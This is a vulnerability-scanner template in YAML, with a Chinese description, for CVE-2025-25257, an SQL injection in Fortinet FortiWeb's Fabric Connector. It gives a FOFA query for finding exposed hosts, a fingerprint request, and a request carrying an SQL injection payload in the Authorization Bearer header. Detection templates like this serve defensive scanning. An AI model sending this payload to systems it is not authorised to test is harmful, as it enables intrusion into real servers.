id: CVE-2025-25257

info:
  name: Fortinet FortiWeb SQL注入漏洞
  author: avic123
  severity: critical
  verified: true
  description: |
    该漏洞源于Fortinet FortiWeb Fabric Connector 组件在认证处理中没有严格校验输入参数，攻击者可在 Authorization: Bearer 头中注入恶意SQL语句，实现远程代码执行获取服务器权限
    fofa：title="fortiweb - "
  reference:
    - https://mp.weixin.qq.com/s/uX7DFLxlxOdVl0Yc-VHUWg
  tags: Fortinet,CVE,CVE-2025-25257,sqli
  created: 2025/07/14

rules:
  r0:
    request:
      method: GET
      path: /
    expression: response.status == 200 && response.body.ibcontains(b"<title>FortiWeb -")
  r1:
    request:
      method: GET
      path: /api/fabric/device/status
      headers:
        Authorization: Bearer 'and('x'='x')union(select(@@global.secure_file_priv));--+-
    expression: >-
      response.status == 401
expression: r0() && r1()
